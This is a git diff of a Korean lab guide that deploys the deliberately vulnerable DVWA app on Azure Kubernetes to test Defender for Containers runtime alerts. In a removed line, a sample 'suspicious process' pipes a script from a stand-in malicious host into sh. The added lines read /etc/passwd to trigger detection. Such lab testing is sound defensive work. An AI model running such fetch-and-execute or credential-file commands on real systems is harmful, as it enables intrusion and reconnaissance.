@@ -120,7 +120,7 @@ kubectl create secret docker-registry acr-secret \
 | **Password / Password2** | `<ACR_PASSWORD>` |
 
 
-* DVWA deployment manifest 작성 후 저장 (dvwa-deployment.yaml) -- `VSCode`에서 진행 (없으면 다운로드)하며 데스크탑에 저장 후 과정 진행
+* DVWA deployment manifest 작성 후 저장 (dvwa-deployment.yaml) -- `VSCode`에서 진행 (없으면 다운로드)하며 데스크탑에 저장 후 과정 진행 -- DVWA 이미지를 명시한 yaml 파일을 kubectl apply로 배포
 ```bash
 apiVersion: apps/v1
 kind: Deployment
@@ -223,10 +223,10 @@ kubectl get pods -A | grep azure
 >
 > * 컨테이너가 실행되는 중(runtime) 에 일어나는 이상 행위, 악성 행위, 취약점 악용 행위를 탐지하고 보호하는 기능
 
-
-
 * Pod name
+```bash
 kubectl get pods
+```
 
 > 출력예시
 > ```bash
@@ -247,8 +247,13 @@ kubectl exec -it <dvwa-pod-name> -- /bin/bash
 ```
 
 * suspicious process 실행 예시
+  * /etc/passwd 출력 = 정보수집 공격
+  * 패스워드 유출을 통해  ➔ 공격자가 시스템 사용자 정보를 얻어 후속 공격(권한 상승, lateral movement) 기반으로 사용
+  * Defender for Containers의 Runtime protection 기능에서, suspicious process 실행을 탐지 ➔ Alert 발생 ➔ 대응 조치
+    
 ```bash
-curl http://malicious-site.com/malware.sh | sh
+ps aux
+cat /etc/passwd
 ```
 
 1. MDC ➔ Alerts에서 탐지 여부 확인
